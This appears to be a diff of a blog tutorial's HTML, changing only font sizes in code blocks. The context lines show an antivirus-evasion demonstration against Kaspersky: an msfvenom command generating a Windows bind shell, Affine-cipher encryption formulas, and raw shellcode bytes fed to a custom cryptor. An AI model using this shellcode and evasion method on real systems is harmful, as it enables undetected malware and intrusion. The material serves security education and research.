@@ -29,7 +29,7 @@ For this exercise we will be using a bind shell generated from metasploit framew
 After the short introduction above, it is time for me to start the practical demonstration and proof of concept regarding the use of a fully undetectable cryptor, to evade the AV engine in Kaspersky Endpoint Security software. For this demonstration i needed a shellcode which could normally be considered to be a malware, so as previously mentioned, i've used a bind shell that listens on port <b>99</b> and was generated from <b>msfvenom</b> tool as follows
 </p>
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~</b></span>$ msfvenom -p windows/shell_bind_tcp LPORT=99 -f C -v code -b '\x00'
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -124,7 +124,7 @@ Later on, and after the compilation finishes, we can see at the image below, tha
 So, at this point we need to perform some encryption to the shellcode in order to avoid detection. But, should encryption be enough to avoid detection ? Well, we'll see.. As said before, the shellcode will be encrypted using the Affine cipher. At this article we will not proceed further into more details about the analysis of the Affine Cipher, but if someone needs further examples and also need to learn more about the algorithm, it is strongly recommended to read this <a href="https://xen0vas.com/2019/05/15/slae-assignment-7-create-a-custom-crypter/">assignment</a>, which i have completed during the <a href="https://www.pentesteracademy.com/course?id=3">SLAE</a> course. It is worth to mention that it is very important to understand the Affine Cipher algorithm and how it can be used before continue reading this article. This cipher takes two keys ,&nbsp; <b>‘a’</b> &nbsp;and&nbsp; <b>‘b’</b> &nbsp;where <b>'a'</b> will have the value 5 and <b>'b'</b> will have the value 8. The encryption formula used to encrypt the shellcode is the following
 </p>
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 y = (x * ((1 << 2) + 1) + 8) & ((32 << 2) - 1)
 </pre>
 
@@ -132,7 +132,7 @@ y = (x * ((1 << 2) + 1) + 8) & ((32 << 2) - 1)
 In the contrary, the decryption formula used to decrypt the shellcode is the following
 </p>
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 x = (y1 - 8) * ((18 << 2) + 5) & ((32 << 2) - 1);
 </pre>
 
@@ -141,7 +141,7 @@ x = (y1 - 8) * ((18 << 2) + 5) & ((32 << 2) - 1);
 Now, at this point we will use the Affine cipher to encrypt the shellcode. I have developed a tool that uses the Afine cipher to encrypt a given shellcode which can be found on my <a href="https://github.com/xen0vas/Affine-Cryptor/blob/master/affine.c">github</a>. The usage of this tool can be seen below
 </p>
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>/home/kali</b></span># ./affine
 
 [x] Error: Provide an option and a valid shellcode
@@ -158,7 +158,7 @@ Options:
 At this point we will use the tool to encrypt the bind shellcode generated from <b>msfvenom</b>.
 </p>
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>/home/kali</b></span># ./affine -e \xba\x8f\xa2\x98\x34\xd9\xca\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x53\x31\x50\x12\x83\xe8\xfc\x03\xdf\xac\x7a\xc1\x23\x58\xf8\x2a\xdb\x99\x9d\xa3\x3e\xa8\x9d\xd0\x4b\x9b\x2d\x92\x19\x10\xc5\xf6\x89\xa3\xab\xde\xbe\x04\x01\x39\xf1\x95\x3a\x79\x90\x15\x41\xae\x72\x27\x8a\xa3\x73\x60\xf7\x4e\x21\x39\x73\xfc\xd5\x4e\xc9\x3d\x5e\x1c\xdf\x45\x83\xd5\xde\x64\x12\x6d\xb9\xa6\x95\xa2\xb1\xee\x8d\xa7\xfc\xb9\x26\x13\x8a\x3b\xee\x6d\x73\x97\xcf\x41\x86\xe9\x08\x65\x79\x9c\x60\x95\x04\xa7\xb7\xe7\xd2\x22\x23\x4f\x90\x95\x8f\x71\x75\x43\x44\x7d\x32\x07\x02\x62\xc5\xc4\x39\x9e\x4e\xeb\xed\x16\x14\xc8\x29\x72\xce\x71\x68\xde\xa1\x8e\x6a\x81\x1e\x2b\xe1\x2c\x4a\x46\xa8\x38\xbf\x6b\x52\xb9\xd7\xfc\x21\x8b\x78\x57\xad\xa7\xf1\x71\x2a\xc7\x2b\xc5\xa4\x36\xd4\x36\xed\xfc\x80\x66\x85\xd5\xa8\xec\x55\xd9\x7c\x98\x5d\x7c\x2f\xbf\xa0\x3e\x9f\x7f\x0a\xd7\xf5\x8f\x75\xc7\xf5\x45\x1e\x60\x08\x66\x20\x12\x85\x80\x4a\xc4\xc3\x1b\xe2\x26\x30\x94\x95\x59\x12\x8c\x31\x11\x74\x0b\x3e\xa2\x52\x3b\xa8\x29\xb1\xff\xc9\x2d\x9c\x57\x9e\xba\x6a\x36\xed\x5b\x6a\x13\x85\xf8\xf9\xf8\x55\x76\xe2\x56\x02\xdf\xd4\xae\xc6\xcd\x4f\x19\xf4\x0f\x09\x62\xbc\xcb\xea\x6d\x3d\x99\x57\x4a\x2d\x67\x57\xd6\x19\x37\x0e\x80\xf7\xf1\xf8\x62\xa1\xab\x57\x2d\x25\x2d\x94\xee\x33\x32\xf1\x98\xdb\x83\xac\xdc\xe4\x2c\x39\xe9\x9d\x50\xd9\x16\x74\xd1\xe9\x5c\xd4\x70\x62\x39\x8d\xc0\xef\xba\x78\x06\x16\x39\x88\xf7\xed\x21\xf9\xf2\xaa\xe5\x12\x8f\xa3\x83\x14\x3c\xc3\x81
 
 [!] Affine Encryption
